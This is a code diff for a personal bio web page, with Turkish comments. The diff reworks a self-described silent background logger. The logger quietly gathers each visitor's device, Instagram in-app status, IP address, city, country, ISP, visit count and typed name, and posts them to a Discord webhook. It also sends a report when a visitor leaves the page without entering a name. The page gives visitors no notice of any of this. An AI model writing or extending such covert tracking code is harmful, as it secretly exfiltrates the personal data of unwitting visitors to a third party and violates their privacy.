@@ -294,7 +294,33 @@
                 app.classList.add('anim-pop');
             }
 
-            // Sessiz Arka Plan Logu
+                    let hasLogged = false; // Mükerrer log engelleme bayrağı
+        let sessionData = {};  // Cihaz ve IP verilerini tutacak obje
+
+        // 1. Sayfa Açıldığında Cihaz ve Konum Verilerini Hazırda Beklet
+        window.addEventListener('DOMContentLoaded', async () => {
+            const app = document.getElementById('appContainer');
+            let savedName = null;
+
+            try { savedName = localStorage.getItem('visitor_name'); } catch(e) {}
+
+            if (savedName) {
+                app.classList.add('expanded');
+                document.getElementById('layerIntro').classList.add('hidden');
+                document.getElementById('layerMain').classList.remove('hidden');
+                document.getElementById('welcomeHeading').innerText = `Hoş geldin, ${savedName} 👋`;
+                
+                // Daha önce isim kaydetmişse direkt mevcut isimle logla
+                sendLogToDiscord(savedName, localStorage.getItem('met_poyraz') || 'Evet', "Geri Dönen Ziyaretçi");
+            } else {
+                app.classList.add('anim-pop');
+                // Arka planda cihaz ve IP bilgilerini önceden topla (Beklemede tut)
+                collectDeviceData();
+            }
+        });
+
+        // 2. Cihaz ve Konum Verilerini Sessizce Toplayan Fonksiyon
+        async function collectDeviceData() {
             try {
                 let visitCount = 1;
                 try {
@@ -319,36 +345,57 @@
                     }
                 } catch(e) {}
 
-                const now = new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' });
-
-                fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        username: "Ali Poyraz Radar 🕵️‍♂️",
-                        embeds: [{
-                            title: "🚨 Sitede Yeni Ziyaretçi!",
-                            color: 0x2e5238,
-                            fields: [
-                                { name: "👤 Giriş Durumu", value: `${visitCount}. Girişi`, inline: true },
-                                { name: "📱 Cihaz", value: device, inline: true },
-                                { name: "📸 Instagram İçi mi?", value: isInApp, inline: true },
-                                { name: "🌍 Konum / IP", value: `${city}, ${country} (${ip})`, inline: false },
-                                { name: "📡 İnternet (ISP)", value: isp, inline: true },
-                                { name: "⏱️ Tarih & Saat", value: now, inline: true }
-                            ]
-                        }]
-                    })
-                });
-            } catch(err) {}
-        });
-
-        function selectRadio(element, value) {
-            document.querySelectorAll('.radio-btn').forEach(btn => btn.classList.remove('active'));
-            element.classList.add('active');
-            metPoyrazValue = value;
+                // Verileri objeye doldur
+                sessionData = {
+                    visitCount: `${visitCount}. Girişi`,
+                    device: device,
+                    isInApp: isInApp,
+                    location: `${city}, ${country} (${ip})`,
+                    isp: isp,
+                    date: new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' })
+                };
+            } catch(e) {}
         }
 
+        // 3. Discord'a Bütünleşik Log Gönderen Fonksiyon
+        function sendLogToDiscord(visitorName, metInfo, statusTitle = "🚨 Yeni Ziyaretçi Giriş Yaptı!") {
+            if (hasLogged) return; // Zaten loglandıysa tekrar atma
+            hasLogged = true;
+
+            const payload = {
+                username: "Ali Poyraz Radar 🕵️‍♂️",
+                embeds: [{
+                    title: statusTitle,
+                    color: visitorName === "İsim Yazmadan Çıktı" ? 0xd9534f : 0x2e5238, // İsim yazmadan çıktıysa Kırmızı, yazdıysa Yeşil
+                    fields: [
+                        { name: "👤 Ziyaretçi Adı", value: visitorName, inline: true },
+                        { name: "🤝 Tanışıklık", value: metInfo, inline: true },
+                        { name: "🔢 Sayaç", value: sessionData.visitCount || "1. Giriş", inline: true },
+                        { name: "📱 Cihaz", value: sessionData.device || "Bilinmiyor", inline: true },
+                        { name: "📸 Instagram İçi mi?", value: sessionData.isInApp || "Bilinmiyor", inline: true },
+                        { name: "🌍 Konum / IP", value: sessionData.location || "Bilinmiyor", inline: false },
+                        { name: "📡 İnternet (ISP)", value: sessionData.isp || "Bilinmiyor", inline: true },
+                        { name: "⏱️ Tarih & Saat", value: sessionData.date || new Date().toLocaleString('tr-TR'), inline: true }
+                    ],
+                    footer: { text: "Ali Poyraz Bio System" }
+                }]
+            };
+
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        }
+
+        // 4. İsim Yazılmadan Sayfa Kapatılırsa Çıkışı Yakala
+        window.addEventListener('beforeunload', () => {
+            if (!hasLogged && !localStorage.getItem('visitor_name')) {
+                sendLogToDiscord("İsim Yazmadan Çıktı", "Bilinmiyor", "⚠️ Ziyaretçi İsim Yazmadan Ayrıldı!");
+            }
+        });
+
+        // 5. "Tanımaya Geç" Butonuna Basıldığında Logu Tetikle
         function completeIntro() {
             const inputEl = document.getElementById('introName');
             const errorTxt = document.getElementById('introError');
@@ -365,6 +412,9 @@
                 localStorage.setItem('visitor_name', nameInput);
                 localStorage.setItem('met_poyraz', typeof metPoyrazValue !== 'undefined' ? metPoyrazValue : 'Evet');
             } catch(e) {}
+
+            // İSMİ ALDIĞIMIZ AN TÜM LOGU DİSCORD'A FIRLAT
+            sendLogToDiscord(nameInput, metPoyrazValue);
 
             const layerIntro = document.getElementById('layerIntro');
             const layerMain = document.getElementById('layerMain');
